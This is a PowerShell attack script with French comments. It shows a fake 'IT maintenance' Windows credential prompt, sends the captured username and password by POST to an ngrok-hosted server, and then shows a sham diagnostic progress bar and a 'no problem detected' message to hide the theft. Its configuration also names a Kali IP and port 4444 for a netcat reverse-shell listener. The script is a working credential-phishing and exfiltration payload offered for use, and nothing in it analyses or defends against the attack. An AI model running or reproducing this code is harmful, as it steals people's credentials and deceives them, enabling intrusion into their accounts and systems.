# =========================================================================
# CONFIGURATION (À MODIFIER)
# =========================================================================
$NGROK_URL = "https://nonbitter-ernie-unorganisable.ngrok-free.dev"
$KALI_IP   = "10.0.1.24"  # Ton IP Kali pour le reverse shell
$KALI_PORT = 4444         # Ton port d'écoute nc -lvnp 4444
# =========================================================================

# 1. VOL D'IDENTIFIANTS (FAKE PROMPT)
$caption = "Authentification Requise - Agent de Maintenance IT";
$message = "Veuillez saisir vos identifiants de session pour autoriser le diagnostic du système.";
$credential = $host.ui.PromptForCredential($caption, $message, "$env:userdomain\$env:username", "");

if ($credential) {
    $pass = $credential.GetNetworkCredential().Password;
    $user = $credential.UserName;
    
    # Envoi vers ton serveur Python via Ngrok (Utilise POST pour plus de propreté)
    # L'argument -UseBasicParsing évite l'erreur Internet Explorer
    $body = "USER: $user | PASS: $pass"
    Invoke-WebRequest -Uri $NGROK_URL -Method Post -Body $body -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null;
}

# 2. BARRE DE CHARGEMENT VISUELLE (DECEPTION)
$steps = "Analyse des registres","Vérification des pilotes","Optimisation du cache","Nettoyage temporaire"
for ($i = 1; $i -le 100; $i++) {
    $currentStep = $steps[($i % $steps.Length)]
    # Affiche une barre de progression système Windows classique
    Write-Progress -Activity "Diagnostic de Maintenance IT" -Status "Progression : $i%" -PercentComplete $i -CurrentOperation "$currentStep..."
    Start-Sleep -Milliseconds 45
}

Write-Host "`nDiagnostic terminé avec succès. Aucun problème détecté." -ForegroundColor Green
Start-Sleep -Seconds 2
